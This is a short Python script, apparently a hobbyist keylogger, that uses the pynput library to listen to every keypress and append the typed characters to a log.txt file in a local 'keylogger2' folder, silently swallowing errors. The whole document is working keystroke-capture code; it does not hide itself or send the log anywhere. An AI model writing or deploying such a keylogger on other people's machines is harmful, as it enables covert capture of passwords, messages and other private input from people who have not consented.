from pynput.keyboard import Listener, Key
import os


filepath = r"C:\Users\lenovo\Desktop\keylogger2\log.txt" 

def write_to_file(key):
    try:
        with open(filepath, 'a') as f:
            f.write(key.char)
            f.flush()
    except:
        pass

print(f"Saving to: {filepath}")
with Listener(on_press=write_to_file) as l:
    l.join()